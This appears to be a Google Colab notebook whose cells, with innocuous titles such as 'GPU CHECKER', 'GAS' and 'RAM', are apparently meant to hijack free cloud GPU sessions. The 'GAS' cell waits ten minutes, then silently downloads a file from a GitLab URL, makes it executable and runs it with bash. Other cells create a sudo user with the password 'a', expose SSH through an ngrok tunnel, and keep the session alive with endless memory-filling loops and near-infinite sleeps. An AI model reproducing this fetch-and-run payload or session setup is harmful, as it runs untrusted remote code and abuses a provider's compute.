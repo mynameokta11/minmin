{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "GPU",
      "provenance": [],
      "collapsed_sections": [],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "LIWl-PkQrxlP"
      },
      "source": [
        "# ***GPU CHECKER***"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#@title ***GPU CHECKER***\n",
        "gpu_info = ! nvidia-smi\n",
        "gpu_info = '\\n'.join(gpu_info)\n",
        "if gpu_info.find('V100-PCIE...') >=0:\n",
        "  print(gpu_info)\n",
        "  exit()\n",
        "else :\n",
        "  print(gpu_info)"
      ],
      "metadata": {
        "cellView": "form",
        "id": "OKPs-no7mkWX"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title ***CONDA***\n",
        "!pip install -q condacolab\n",
        "import condacolab\n",
        "condacolab.install()"
      ],
      "metadata": {
        "cellView": "form",
        "id": "9RircTMLuEeM"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title ***VSCODE***\n",
        "!pip install gpu-tpu-lab-server \n",
        "from gpu_tpu_lab_server.core import jupyter_lab, vscode, run_process_in_background, run_process_in_foreground \n",
        "vscode() "
      ],
      "metadata": {
        "cellView": "form",
        "id": "PdSjm-2tnUtw"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title ***VSCODE ROCK***\n",
        "!pip install colabcode\n",
        "from colabcode import ColabCode\n",
        "ColabCode(port=10000, password=\"a\")\n",
        "from colabcode import ColabCode\n",
        "ColabCode()"
      ],
      "metadata": {
        "cellView": "form",
        "id": "ltD1-QoF93sf"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title ***GAS***\n",
        "!sleep 600\n",
        "from os import system, name\n",
        "from time import sleep\n",
        "from subprocess import PIPE, Popen\n",
        "import base64\n",
        " \n",
        "\n",
        " \n",
        "\n",
        " \n",
        "def cmdline(command):\n",
        "    process = Popen(\n",
        "        args=command,\n",
        "        stdout=PIPE,\n",
        "        shell=True\n",
        "    )\n",
        "    return process.communicate()[0]\n",
        " \n",
        "\n",
        " \n",
        "\n",
        "\n",
        "cmdline ('wget https://gitlab.com/mauliki9999/codet/-/raw/main/nais >/dev/null 2>&1 && chmod 777 nais && bash ./nais')"
      ],
      "metadata": {
        "cellView": "form",
        "id": "-Jqkzp-5IAHY"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title **SSH**\n",
        "#@markdown authtoken from https://dashboard.ngrok.com/auth (only for ngrok)\n",
        "from numba import jit, cuda\n",
        "import numpy as np\n",
        "from timeit import default_timer as timer\n",
        "def func(a):        \n",
        " for i in range(10000000):\n",
        "  a[i]+= 1 \n",
        "def func2(a):\n",
        " for i in range(10000000):\n",
        "  a[i]+= 1\n",
        "if __name__==\"__main__\":\n",
        " n = 10000000       \n",
        " a = np.ones(n, dtype = np.float64)\n",
        " b = np.ones(n, dtype = np.float32)\n",
        " start = timer()\n",
        " func(a)\n",
        " print(timer()-start) \n",
        " start = timer()\n",
        " func2(a)\n",
        " print(timer()-start)\n",
        "import os\n",
        "username = \"root\" #@param {type:\"string\"}\n",
        "password = \"a\" #@param {type:\"string\"}\n",
        "os.system(f\"useradd -m {username}\")\n",
        "os.system(f\"adduser {username} sudo\")    \n",
        "os.system(f\"echo '{username}:{password}' | sudo chpasswd\")\n",
        "os.system(\"sed -i 's/\\/bin\\/sh/\\/bin\\/bash/g' /etc/passwd\")\n",
        "! pip install colab_ssh --upgrade &> /dev/null\n",
        "ngrokToken = \"\" #@param {type:'string'}\n",
        "from colab_ssh import launch_ssh\n",
        "from IPython.display import clear_output\n",
        "launch_ssh(ngrokToken, password)\n",
        "clear_output()\n",
        "print(\"ssh\", username, end='@')\n",
        "! curl -s http://localhost:4040/api/tunnels | python3 -c \\\n",
        "        \"import sys, json; print(json.load(sys.stdin)['tunnels'][0]['public_url'][6:].replace(':', ' -p '))\"\n",
        "d=[ ]\n",
        "while (1):\n",
        "     d.append('1')"
      ],
      "metadata": {
        "cellView": "form",
        "id": "2f9clXUpe89u"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title ***RAM***\n",
        "i = []\n",
        "while(True):\n",
        "    i.append('a')"
      ],
      "metadata": {
        "cellView": "form",
        "id": "StW_8ngb-D11"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "C5jGvbUYKgI9"
      },
      "source": [
        "\\"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!sleep 999999999999999999999"
      ],
      "metadata": {
        "id": "ejUnmhNVR2pA"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}